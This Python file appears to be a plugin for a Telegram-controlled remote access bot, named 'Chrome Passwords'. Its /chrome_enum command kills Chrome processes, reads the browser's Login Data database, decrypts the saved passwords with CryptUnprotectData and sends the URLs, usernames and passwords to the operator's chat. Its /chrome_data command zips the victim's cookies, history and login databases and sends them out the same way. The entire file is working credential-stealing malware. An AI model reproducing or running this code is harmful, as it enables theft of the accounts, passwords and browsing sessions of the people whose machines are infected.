from plugins import Plugin, Command

from threading import Thread

from zipfile import ZipFile
import os
import sqlite3
import psutil

try:
    import win32crypt
    from winreg import *
    win32_available = True
except:
    win32_available = False

class Main(Plugin):

    name = 'Chrome Passwords'
    version = '1.0.0'
    
    def setup(self):

        self.databases = ['Bookmarks', 'Cookies', 'History', 'Login Data', 'Preferences', 'Web Data']
        
        c = Command('/chrome_enum', usage='HOSTNAME /chrome_enum - grab Google Chrome stored credentials')
        self.add_command(c)

        c = Command('/chrome_data', usage='HOSTNAME /chrome_data - grab Google Chrome database files')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/chrome_enum':
            arg_list = [chat_id]

            t = Thread(target=self.handle_chrome_enum, args=tuple(arg_list))
            t.start()

        elif command == '/chrome_data':
            arg_list = [chat_id]

            t = Thread(target=self.handle_chrome_data, args=tuple(arg_list))
            t.start()

    def handle_chrome_data(self, chat_id):
        try:
            self.bot.send_message(chat_id, 'Gathering data...')
            if self.bot.platform == 'win32':
                path = os.path.join(os.getenv('localappdata'), 'Google\\Chrome\\User Data\\Default')
            elif self.bot.platform in ['linux', 'linux2']:
                path = os.path.join(os.environ.get('HOME'), '.config/google-chrome/Default')

            zname = self.bot.generate_file_name('chrome_data.zip')


            with ZipFile(zname, 'wb') as z:
                for db in self.databases:
                    z.write(os.path.join(path, db))

            with open(zname, 'rb') as f:

                self.bot.bot.sendDocument(chat_id, f)
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def handle_chrome_enum(self, chat_id):
        try:
            passwd = self.bot.generate_file_name('passw.txt')
            process = psutil.pids()
            for x in process:
                try:
                    p = psutil.Process(x)
                    if 'chrome' in p.name().lower():
                        msg = 'Google PID %d terminated' %x
                        self.bot.send_message(chat_id, msg)
                        p.terminate()
                except Exception as e:
                    pass

            credentials = []
            if self.bot.platform == 'win32':
                path = os.path.join(os.getenv('localappdata'), 'Google\\Chrome\\User Data\\Default')
            elif self.bot.platform in ['linux', 'linux2']:
                path = os.path.join(os.environ.get('HOME'), '.config/google-chrome/Default')
            if (os.path.isdir(path)):
                connection = sqlite3.connect(os.path.join(path, "Login Data"))
                print(os.path.join(path, "Login Data"))
                try:
                    with connection:
                        cursor = connection.cursor()
                        v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                        value = v.fetchall()

                    for information in value:
                        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1] if win32_available else information[2]
                        if password:
                            credentials.append('URL: {}'.format(information[0]))
                            credentials.append('Username: {}'.format(information[1]))
                            credentials.append('Password: {}'.format(str(password)))
                            credentials.append(' ')
                    f = open(passwd, 'w')
                    f.write('\n'.join(credentials))
                    f.close()
                    self.bot.bot.sendDocument(chat_id, open(passwd))
                    os.remove(passwd)
                except Exception as e:
                    self.bot.send_message(chat_id, str(e))
            else:
                self.bot.send_message(chat_id, 'Chrome Doesn\'t exists')
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
